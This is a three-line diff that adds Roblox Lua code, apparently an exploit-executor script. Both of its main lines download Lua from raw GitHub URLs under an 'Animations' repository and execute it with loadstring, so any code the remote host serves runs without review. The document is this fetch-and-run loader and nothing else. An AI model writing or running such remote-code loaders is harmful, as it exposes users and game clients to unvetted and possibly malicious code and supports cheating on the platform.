@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Thealtforluasxd/Animations/main/Ok"))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Thealtforluasxd/Animations/main/Ok1"))()
